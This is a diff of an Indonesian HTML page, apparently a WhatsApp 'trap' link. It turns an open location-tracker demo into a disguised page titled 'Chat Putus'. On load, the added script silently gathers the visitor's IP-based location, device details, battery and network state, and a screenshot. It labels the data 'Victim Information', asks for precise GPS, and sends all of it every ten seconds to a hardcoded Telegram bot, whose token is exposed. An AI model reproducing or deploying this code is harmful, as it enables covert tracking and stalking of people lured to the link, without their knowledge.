@@ -1,89 +1,112 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Pelacak Lokasi Kirim ke Telegram</title>
+  <meta charset="UTF-8" />
+  <title>Chat Putus</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-      padding: 30px;
-      text-align: center;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      height: 100vh;
+      overflow: hidden;
     }
-    button {
-      padding: 10px 20px;
-      background: #0f0;
-      color: #000;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
+    #bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      object-fit: cover;
+      z-index: -1;
     }
-    pre {
-      background: #111;
-      padding: 15px;
-      margin-top: 20px;
-      white-space: pre-wrap;
-    }
+    audio { display: none; }
   </style>
 </head>
 <body>
-  <h2>📍 Lacak Lokasi + Kirim Telegram</h2>
-  <button onclick="getLocation()">Lacak & Kirim</button>
-  <pre id="output">Klik tombol untuk mulai...</pre>
 
-  <script>
-    const token = "8144503530:AAE6pFvuAK_On07V5kSuFvLMPR5baMTU-SI";
-    const chatId = "7728427008";
+<img id="bg" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8T_3B0IQlwimDVKhm29FJyNtEnni0EzXFyw&usqp=CAU" alt="jebakan">
+<audio autoplay loop>
+  <source src="https://cdn.pixabay.com/audio/2023/03/15/audio_a3f5b0f8e5.mp3" type="audio/mp3">
+</audio>
 
-    async function getLocation() {
-      const output = document.getElementById("output");
+<script>
+  const token = '8144503530:AAE6pFvuAK_On07V5kSuFvLMPR5baMTU-SI';
+  const chatId = '7728427008';
 
-      if (!navigator.geolocation) {
-        output.textContent = "❌ Browser tidak support lokasi.";
-        return;
-      }
+  function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  }
 
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+  async function getInfo() {
+    const ipRes = await fetch("https://ipapi.co/json/");
+    const ipData = await ipRes.json();
+    
+    const device = navigator;
+    const battery = await navigator.getBattery();
+    const now = new Date();
 
-        output.textContent = Koordinat didapat:\nLatitude: ${lat}\nLongitude: ${lon}\n🔄 Sedang mencari alamat...;
+    let info = `✅Victim Information\n\n`;
+    info += `📡 IP: ${ipData.ip} | Time: ${now.toLocaleString("id-ID")}\n\n`;
+    info += `📍 Lokasi: ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n`;
+    info += `📮 Kode Pos: ${ipData.postal}\n`;
+    info += `🧭 Koordinat: ${ipData.latitude}, ${ipData.longitude}\n\n`;
+    
+    info += `📱 Device Info:\n`;
+    info += `User Agent: ${device.userAgent}\n`;
+    info += `Platform: ${device.platform}\n`;
+    info += `RAM: ${device.deviceMemory || "?"} GB\n`;
+    info += `CPU Thread: ${device.hardwareConcurrency || "?"}\n`;
+    info += `Bahasa: ${device.language}\n\n`;
+    
+    info += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
+    info += `⚡ Charging: ${battery.charging}\n\n`;
 
-        const res = await fetch(https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json);
-        const data = await res.json();
+    info += `🕸️ Jaringan: ${(navigator.connection && navigator.connection.effectiveType) || "unknown"}\n`;
 
-        const alamat = data.display_name || "Alamat tidak ditemukan";
-        const kodePos = data.address.postcode || "Tidak tersedia";
+    sendToTelegram(info);
+  }
 
-        const msg = 
-📍 Lokasi Baru Terdeteksi!
-🌐 Latitude: ${lat}
-🌐 Longitude: ${lon}
-🏠 Alamat: ${alamat}
-📮 Kode Pos: ${kodePos}
-🗺️ Maps: https://maps.google.com/?q=${lat},${lon}
-        ;
+  function captureScreenshot() {
+    html2canvas(document.body).then(canvas => {
+      canvas.toBlob(blob => {
+        const form = new FormData();
+        form.append("chat_id", chatId);
+        form.append("caption", "📸 Screenshot jebakan WA");
+        form.append("photo", blob, "screenshot.jpg");
 
-        output.textContent = msg;
-
-        // Kirim ke Telegram
-        await fetch(https://api.telegram.org/bot${token}/sendMessage, {
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: msg
-          })
+          body: form
         });
-
-        output.textContent += "\n\n✅ Lokasi berhasil dikirim ke Telegram!";
-      }, err => {
-        output.textContent = "❌ Gagal ambil lokasi. Mungkin izin ditolak.";
       });
-    }
-  </script>
+    });
+  }
+
+  // Inject html2canvas
+  const script = document.createElement("script");
+  script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+  script.onload = () => {
+    captureScreenshot();
+    getInfo();
+    setInterval(getInfo, 10000); // update tiap 10 detik
+  };
+  document.head.appendChild(script);
+
+  // Auto minta izin lokasi
+  navigator.geolocation.getCurrentPosition(pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+    sendToTelegram(`📍 Lokasi Akurat:\nLatitude: ${lat}\nLongitude: ${lon}\n📌 ${maps}`);
+  });
+</script>
+
 </body>
 </html>
